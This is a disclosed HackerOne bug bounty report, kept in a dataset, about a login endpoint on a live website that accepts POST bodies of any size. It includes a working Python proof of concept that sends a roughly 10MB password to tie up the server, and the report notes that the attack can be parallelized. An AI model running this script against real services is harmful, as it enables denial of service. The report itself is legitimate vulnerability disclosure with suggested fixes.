---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '418254'
original_report_id: '418254'
title: Unrestricted POST request size on roomlogin endpoint
weakness: Uncontrolled Resource Consumption
team_handle: chaturbate
created_at: '2018-10-03T14:45:32.783Z'
disclosed_at: '2018-10-07T14:55:42.685Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 14
asset_identifier: chaturbate.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Unrestricted POST request size on roomlogin endpoint

## Metadata

- HackerOne Report ID: 418254
- Weakness: Uncontrolled Resource Consumption
- Program: chaturbate
- Disclosed At: 2018-10-07T14:55:42.685Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

POST requests to endpoint `/roomlogin/<user>` are not limited in size. While the main website login endpoint correctly limits the size of request, this endpoint does not. This can be a mean to perform a DOS attack.

## Steps To Reproduce:

  1. `<user>` has a password-protected stream.
  2. Send a large POST request to `/roomlogin/<user>` (e.g., a really long password).

## Expected behaviour
HTTP error 413 is promptly returned.

## Actual behaviour
Server reads and processes the whole request, consuming long amounts of time.

## POC
This Python snippet can reproduce the issue. A ~10MB request consumes about 30 seconds of server time. I did not proceed further to avoid disrupting the service and because this attack which can be easily parallelized has itself a pretty serious impact.

```
import requests
url = "https://it.chaturbate.com/roomlogin/█████/"
csrf = "███████"

password_size = 10 * 1000 * 1000
payload = {'password': 'a' * password_size, 'next': '/████/', 'csrfmiddlewaretoken' : csrf}

s = requests.Session()
s.headers.update({'referer': url})
s.cookies.set("csrftoken", csrf)
s.cookies.set("sessionid", "█████████")
r = s.post(url, data=payload)

print r.elapsed
```

```
0:00:40.249484
```

## Suggested resolution steps

- Put a reasonable low limit to request size, as it already happens with main login.
- (Optional) Limit the max-size of input element `#id_password` to 64 characters.

## Impact

DOS of the main website. The attack can be easily parallelized, leading to potentially severe DDOS.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
